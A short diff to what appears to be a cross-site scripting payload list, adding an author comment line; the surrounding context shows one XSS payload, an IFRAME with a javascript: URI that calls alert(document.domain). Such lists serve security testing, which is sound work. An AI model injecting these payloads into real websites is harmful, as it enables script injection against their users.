@@ -11,6 +11,7 @@ xss
 ```
 
 <!-- Project Name  : Cross Site Scripting ( XSS ) Vulnerability Payload List -->
+<!--        Author : Ismail Tasdelen -->
 
 <IFRAME SRC="javascript:javascript:alert(document.domain);"></IFRAME>
 
